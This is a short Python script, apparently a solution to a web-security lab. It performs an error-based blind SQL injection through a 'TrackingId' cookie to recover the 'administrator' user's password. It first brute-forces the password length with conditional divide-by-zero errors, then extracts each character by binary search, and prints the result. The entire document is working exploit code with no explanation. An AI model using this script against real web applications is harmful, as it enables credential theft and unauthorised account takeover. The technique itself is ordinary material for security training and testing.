import requests

url: str = input("Enter URL: ")
trackingId: str = "YOUR_TRACKING_ID"
session: str = "YOUR_SESSION"

characters_number: int = 0
while True:
    length_payload: str = (f"' || (SELECT CASE WHEN LENGTH(password) = {characters_number} THEN '' "
                           f"ELSE to_char(1/0) END FROM users WHERE username = 'administrator') || '")
    cookies: dict = {"TrackingId": trackingId + length_payload, "session": session}

    response: requests.models.Response = requests.get(url, cookies=cookies)
    if response.status_code == 200:
        break
    characters_number += 1

print(f"Password length = {characters_number}. Start determining characters")

LEFT_BOUND: int = 33
RIGHT_BOUND: int = 127

password = ''
for i in range(characters_number):
    left_bound: int = LEFT_BOUND
    right_bound: int = RIGHT_BOUND
    character: int = (left_bound + right_bound)//2

    while True:
        character_payload: str = (f"' || (SELECT CASE WHEN SUBSTR(password, {i + 1}, 1) > '{chr(character)}' "
                                  f"THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username = 'administrator') || '")
        cookies = {"TrackingId": trackingId + character_payload, "session": session}

        response: requests.models.Response = requests.get(url, cookies=cookies)
        if response.status_code == 200:
            left_bound = character + 1
            character = (left_bound + right_bound)//2
        else:
            right_bound = character
            character = (left_bound + right_bound)//2
        if left_bound == right_bound:
            break

    password += chr(character)

print(password)


